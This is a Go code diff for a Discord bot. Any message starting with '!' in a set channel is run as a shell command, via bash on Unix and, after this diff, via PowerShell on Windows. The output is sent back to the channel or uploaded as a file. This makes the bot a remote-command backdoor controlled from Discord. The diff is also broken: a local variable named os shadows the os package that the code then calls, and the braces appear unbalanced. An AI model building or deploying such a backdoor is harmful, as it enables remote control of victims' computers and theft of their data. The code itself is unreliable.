@@ -12,6 +12,7 @@ import (
 	"strings"
 	"syscall"
 	"time"
+	"runtime"
 
 	"github.com/bwmarrin/discordgo"
 	"github.com/joho/godotenv"
@@ -23,38 +24,72 @@ func execute(s *discordgo.Session, m *discordgo.MessageCreate) {
 	}
 
 	channelID := setup()
+	os := runtime.GOOS
+	
+	if(os != "windows"){
+		if m.ChannelID == channelID {
+			if strings.Contains(m.Content, "!") {
+				command := m.Content[1:]
 
-	if m.ChannelID == channelID {
-		if strings.Contains(m.Content, "!") {
-			command := m.Content[1:]
-
-			cmd := exec.Command("/bin/bash", "-c", command)
-			out, err := cmd.Output()
-			if err != nil {
-				fmt.Println(err, " on ", command)
-				s.ChannelMessageSend(m.ChannelID, string("Sorry the command failed, please try again."))
-			}
-
-			if len(out) > 2000 {
-				now := time.Now()
-				filename := "SOHAIL" + now.Format("2006-01-02_15-04-05.txt")
-				err := ioutil.WriteFile(filename, []byte(out), 0644)
+				cmd := exec.Command("/bin/bash", "-c", command)
+				out, err := cmd.Output()
 				if err != nil {
-					fmt.Print(err)
+					fmt.Println(err, " on ", command)
+					s.ChannelMessageSend(m.ChannelID, string("Sorry the command failed, please try again."))
 				}
-				file, err := os.Open(filename)
-				if err != nil {
-					fmt.Println(err)
-				}
-				defer file.Close()
 
-				s.ChannelMessageSend(m.ChannelID, "Output too long, sending as file")
-				s.ChannelFileSend(m.ChannelID, filename, file)
+				if len(out) > 2000 {
+					now := time.Now()
+					filename := "SOHAIL" + now.Format("2006-01-02_15-04-05.txt")
+					err := ioutil.WriteFile(filename, []byte(out), 0644)
+					if err != nil {
+						fmt.Print(err)
+					}
+					file, err := os.Open(filename)
+					if err != nil {
+						fmt.Println(err)
+					}
+					defer file.Close()
+
+					s.ChannelMessageSend(m.ChannelID, "Output too long, sending as file")
+					s.ChannelFileSend(m.ChannelID, filename, file)
+				}
+
+				s.ChannelMessageSend(m.ChannelID, string(out))
 			}
-
-			s.ChannelMessageSend(m.ChannelID, string(out))
 		}
-	}
+	}else{
+		if m.ChannelID == channelID {
+			if strings.Contains(m.Content, "!") {
+				command := m.Content[1:]
+	
+				cmd := exec.Command("powershell", "/C", command)
+				out, err := cmd.Output()
+				if err != nil {
+					fmt.Println(err, " on ", command)
+					s.ChannelMessageSend(m.ChannelID, string("Sorry the command failed, please try again. with error: " + err.Error()))
+				}
+	
+				if len(out) > 2000 {
+					now := time.Now()
+					filename := "SOHAIL" + now.Format("2006-01-02_15-04-05.txt")
+					err := ioutil.WriteFile(filename, []byte(out), 0644)
+					if err != nil {
+						fmt.Print(err)
+					}
+					file, err := os.Open(filename)
+					if err != nil {
+						fmt.Println(err)
+					}
+					defer file.Close()
+	
+					s.ChannelMessageSend(m.ChannelID, "Output too long, sending as file")
+					s.ChannelFileSend(m.ChannelID, filename, file)
+				}
+	
+				s.ChannelMessageSend(m.ChannelID, string(out))
+			}
+		}
 }
 
 func getLocalIP() (string, error) {
